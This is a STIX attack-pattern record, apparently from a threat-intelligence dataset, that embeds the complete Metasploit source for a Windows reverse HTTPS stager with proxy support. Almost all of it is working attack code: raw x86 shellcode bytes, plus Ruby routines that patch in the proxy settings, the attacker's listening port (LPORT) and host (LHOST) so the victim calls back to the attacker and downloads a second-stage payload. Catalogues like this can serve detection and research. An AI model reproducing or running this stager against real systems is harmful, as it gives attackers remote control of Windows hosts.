{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8ee039ed-3ab2-4a25-94ed-1285db5bbe06",
    "created": "2024-08-14T16:33:19.487444Z",
    "modified": "2024-08-14T16:33:19.487448Z",
    "name": "Reverse HTTPS Stager with Support for Custom Proxy",
    "description": "Tunnel communication over HTTP using SSL with custom proxy support",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/stagers/windows/reverse_https_proxy.rb",
            "external_id": "reverse_https_proxy.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\nmodule MetasploitModule\n\n  CachedSize = 384\n\n  include Msf::Payload::Stager\n  include Msf::Payload::Windows\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'Reverse HTTPS Stager with Support for Custom Proxy',\n      'Description'   => 'Tunnel communication over HTTP using SSL with custom proxy support',\n      'Author'        => ['hdm','corelanc0d3r <peter.ve[at]corelan.be>', 'amaloteaux'],\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'win',\n      'Arch'          => ARCH_X86,\n      'Handler'       => Msf::Handler::ReverseHttpsProxy,\n      'Convention'    => 'sockedi https',\n      'Stager'        =>\n        {\n          'Payload' =>\n            \"\\xFC\\xE8\\x82\\x00\\x00\\x00\\x60\\x89\\xE5\\x31\\xC0\\x64\\x8B\\x50\\x30\\x8B\" +\n            \"\\x52\\x0C\\x8B\\x52\\x14\\x8B\\x72\\x28\\x0F\\xB7\\x4A\\x26\\x31\\xFF\\xAC\\x3C\" +\n            \"\\x61\\x7C\\x02\\x2C\\x20\\xC1\\xCF\\x0D\\x01\\xC7\\xE2\\xF2\\x52\\x57\\x8B\\x52\" +\n            \"\\x10\\x8B\\x4A\\x3C\\x8B\\x4C\\x11\\x78\\xE3\\x48\\x01\\xD1\\x51\\x8B\\x59\\x20\" +\n            \"\\x01\\xD3\\x8B\\x49\\x18\\xE3\\x3A\\x49\\x8B\\x34\\x8B\\x01\\xD6\\x31\\xFF\\xAC\" +\n            \"\\xC1\\xCF\\x0D\\x01\\xC7\\x38\\xE0\\x75\\xF6\\x03\\x7D\\xF8\\x3B\\x7D\\x24\\x75\" +\n            \"\\xE4\\x58\\x8B\\x58\\x24\\x01\\xD3\\x66\\x8B\\x0C\\x4B\\x8B\\x58\\x1C\\x01\\xD3\" +\n            \"\\x8B\\x04\\x8B\\x01\\xD0\\x89\\x44\\x24\\x24\\x5B\\x5B\\x61\\x59\\x5A\\x51\\xFF\" +\n            \"\\xE0\\x5F\\x5F\\x5A\\x8B\\x12\\xEB\\x8D\\x5D\\x68\\x6E\\x65\\x74\\x00\\x68\\x77\" +\n            \"\\x69\\x6E\\x69\\x54\\x68\\x4C\\x77\\x26\\x07\\xFF\\xD5\\xE8\\x0F\\x00\\x00\\x00\" +\n            \"\\x50\\x52\\x4F\\x58\\x59\\x48\\x4F\\x53\\x54\\x3A\\x50\\x4F\\x52\\x54\\x00\\x59\" +\n            \"\\x31\\xFF\\x57\\x54\\x51\\x6A\\x03\\x6A\\x00\\x68\\x3A\\x56\\x79\\xA7\\xFF\\xD5\" +\n            \"\\xE9\\xC4\\x00\\x00\\x00\\x5B\\x31\\xC9\\x51\\x51\\x6A\\x03\\x51\\x51\\x68\\x5C\" +\n            \"\\x11\\x00\\x00\\x53\\x50\\x68\\x57\\x89\\x9F\\xC6\\xFF\\xD5\\x89\\xC6\\x50\\x52\" +\n            \"\\x4F\\x58\\x59\\x5F\\x41\\x55\\x54\\x48\\x5F\\x53\\x54\\x41\\x52\\x54\\xE8\\x0F\" +\n            \"\\x00\\x00\\x00\\x50\\x52\\x4F\\x58\\x59\\x5F\\x55\\x53\\x45\\x52\\x4E\\x41\\x4D\" +\n            \"\\x45\\x00\\x59\\x6A\\x0F\\x51\\x6A\\x2B\\x56\\x68\\x75\\x46\\x9E\\x86\\xFF\\xD5\" +\n            \"\\xE8\\x0F\\x00\\x00\\x00\\x50\\x52\\x4F\\x58\\x59\\x5F\\x50\\x41\\x53\\x53\\x57\" +\n            \"\\x4F\\x52\\x44\\x00\\x59\\x6A\\x0F\\x51\\x6A\\x2C\\x56\\x68\\x75\\x46\\x9E\\x86\" +\n            \"\\xFF\\xD5\\x50\\x52\\x4F\\x58\\x59\\x5F\\x41\\x55\\x54\\x48\\x5F\\x53\\x54\\x4F\" +\n            \"\\x50\\xEB\\x48\\x59\\x31\\xD2\\x52\\x68\\x00\\x32\\xA0\\x84\\x52\\x52\\x52\\x51\" +\n            \"\\x52\\x56\\x68\\xEB\\x55\\x2E\\x3B\\xFF\\xD5\\x89\\xC6\\x6A\\x10\\x5B\\x68\\x80\" +\n            \"\\x33\\x00\\x00\\x89\\xE0\\x6A\\x04\\x50\\x6A\\x1F\\x56\\x68\\x75\\x46\\x9E\\x86\" +\n            \"\\xFF\\xD5\\x31\\xFF\\x57\\x57\\x57\\x57\\x56\\x68\\x2D\\x06\\x18\\x7B\\xFF\\xD5\" +\n            \"\\x85\\xC0\\x75\\x1A\\x4B\\x74\\x10\\xEB\\xD5\\xEB\\x49\\xE8\\xB3\\xFF\\xFF\\xFF\" +\n            \"\\x2F\\x31\\x32\\x33\\x34\\x35\\x00\\x68\\xF0\\xB5\\xA2\\x56\\xFF\\xD5\\x6A\\x40\" +\n            \"\\x68\\x00\\x10\\x00\\x00\\x68\\x00\\x00\\x40\\x00\\x57\\x68\\x58\\xA4\\x53\\xE5\" +\n            \"\\xFF\\xD5\\x93\\x53\\x53\\x89\\xE7\\x57\\x68\\x00\\x20\\x00\\x00\\x53\\x56\\x68\" +\n            \"\\x12\\x96\\x89\\xE2\\xFF\\xD5\\x85\\xC0\\x74\\xCD\\x8B\\x07\\x01\\xC3\\x85\\xC0\" +\n            \"\\x75\\xE5\\x58\\xC3\\xE8\\xEC\\xFE\\xFF\\xFF\"\n        }\n      ))\n\n\n  end\n\n  #\n  # Do not transmit the stage over the connection.  We handle this via HTTPS\n  #\n  def stage_over_connection?\n    false\n  end\n\n  #\n  # Generate the first stage\n  #\n  def generate(_opts = {})\n    p = super\n\n    i = p.index(\"/12345\\x00\")\n    u = \"/\" + generate_uri_checksum(Msf::Handler::ReverseHttpsProxy::URI_CHECKSUM_INITW) + \"\\x00\"\n    p[i, u.length] = u\n\n    # patch proxy info\n    proxyhost = datastore['HttpProxyHost'].to_s\n    proxyport = datastore['HttpProxyPort'].to_s || \"8080\"\n\n    if Rex::Socket.is_ipv6?(proxyhost)\n      proxyhost = \"[#{proxyhost}]\"\n    end\n\n    proxyinfo = proxyhost + \":\" + proxyport\n    if proxyport == \"80\"\n      proxyinfo = proxyhost\n    end\n    if datastore['HttpProxyType'].to_s == 'HTTP'\n      proxyinfo = 'http://' + proxyinfo\n    else #socks\n      proxyinfo = 'socks=' + proxyinfo\n    end\n\n    proxyloc = p.index(\"PROXYHOST:PORT\")\n    p = p.gsub(\"PROXYHOST:PORT\",proxyinfo)\n\n    # Patch the call\n    calloffset = proxyinfo.length + 1\n    p[proxyloc-4] = [calloffset].pack('V')[0]\n\n    # Authentication credentials have not been specified\n    if datastore['HttpProxyUser'].to_s == '' ||\n       datastore['HttpProxyPass'].to_s == '' ||\n       datastore['HttpProxyType'].to_s == 'SOCKS'\n\n      jmp_offset = p.index(\"PROXY_AUTH_STOP\") + 15 - p.index(\"PROXY_AUTH_START\")\n\n      # Remove the authentication code\n      p = p.gsub(/PROXY_AUTH_START(.)*PROXY_AUTH_STOP/i, \"\")\n    else\n      username_size_diff = 14 - datastore['HttpProxyUser'].to_s.length\n      password_size_diff = 14 - datastore['HttpProxyPass'].to_s.length\n      jmp_offset =\n        16 + # PROXY_AUTH_START length\n        15 + # PROXY_AUTH_STOP length\n        username_size_diff + # Difference between datastore HttpProxyUser length  and db \"HttpProxyUser length\"\n        password_size_diff   # Same with HttpProxyPass\n\n      # Patch call offset\n      username_loc = p.index(\"PROXY_USERNAME\")\n      p[username_loc - 4, 4] = [15 - username_size_diff].pack(\"V\")\n      password_loc = p.index(\"PROXY_PASSWORD\")\n      p[password_loc - 4, 4] = [15 - password_size_diff].pack(\"V\")\n\n      # Remove markers & change login/password\n      p = p.gsub(\"PROXY_AUTH_START\",\"\")\n      p = p.gsub(\"PROXY_AUTH_STOP\",\"\")\n      p = p.gsub(\"PROXY_USERNAME\", datastore['HttpProxyUser'].to_s)\n      p = p.gsub(\"PROXY_PASSWORD\", datastore['HttpProxyPass'].to_s)\n    end\n\n    # Patch jmp dbl_get_server_host\n    jmphost_loc = p.index(\"\\x68\\x3a\\x56\\x79\\xa7\\xff\\xd5\") + 8 # push 0xA779563A        ; hash( \"wininet.dll\", \"InternetOpenA\" ) ; call ebp\n    p[jmphost_loc, 4] = [p[jmphost_loc, 4].unpack(\"V\")[0] - jmp_offset].pack(\"V\")\n\n    # Patch call Internetopen\n    p[p.length - 4, 4] = [p[p.length - 4, 4].unpack(\"V\")[0] + jmp_offset].pack(\"V\")\n\n    # Patch the LPORT\n    lportloc = p.index(\"\\x68\\x5c\\x11\\x00\\x00\")  # PUSH DWORD 4444\n    p[lportloc+1,4] = [datastore['LPORT'].to_i].pack('V')\n\n    # Append LHOST and return payload\n    p + datastore['LHOST'].to_s + \"\\x00\"\n\n  end\n\n  #\n  # Always wait at least 20 seconds for this payload (due to staging delays)\n  #\n  def wfs_delay\n    20\n  end\nend\n\n",
    "x_mitre_platforms": [
        "win'"
    ]
}